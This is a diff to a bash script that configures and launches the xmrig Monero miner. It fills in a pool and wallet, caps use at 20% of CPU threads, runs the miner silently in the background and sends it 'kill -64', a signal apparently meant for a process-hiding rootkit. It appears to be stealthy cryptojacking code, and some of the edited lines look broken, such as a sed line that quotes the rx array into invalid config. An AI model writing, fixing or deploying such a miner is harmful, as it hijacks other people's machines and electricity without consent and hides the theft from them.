@@ -27,14 +27,16 @@ fi
 
 threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
 usable_threads=$((threads * 20 / 100))
-rx_array="\"rx\": ["
+rx_array='['
 for ((n = 0; n < $usable_threads; n++));do
     rx_array+="-1"
     if [ $n -lt $((usable_threads-1)) ];then
         rx_array+=", "
     fi
 done
-rx_array+="],"
+rx_array+='],'
+echo "$rx_array"
+sleep 2
 #if binary or config dont exist at specified location then reaquire it
 #deleting everything from the directory to be safe and to clean up
 if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
@@ -52,7 +54,7 @@ if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 	
 	sed -i "s|\"url\": \".*\"|\"url\": \"$pool\"|" "$xmrig_config"
 	sed -i "s|\"user\": \".*\"|\"user\": \"$wallet\"|" "$xmrig_config"
-    sed -i "s|\"rx\": \[.*\]|$rx_array|" "$xmrig_config"
+	sed -i "s|\"rx\": .*|\"rx\": \"$rx_array\"|" "$xmrig_config"
 ) &
 
 fi
@@ -78,10 +80,8 @@ if [ "$threads" -gt 4 ]; then
 (	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config ]; do
 		sleep 5
 	done
-	"$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1	
+	"$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1 &	
 	kill -64 $!
-
-	$ready=1
 ) &
 fi
 
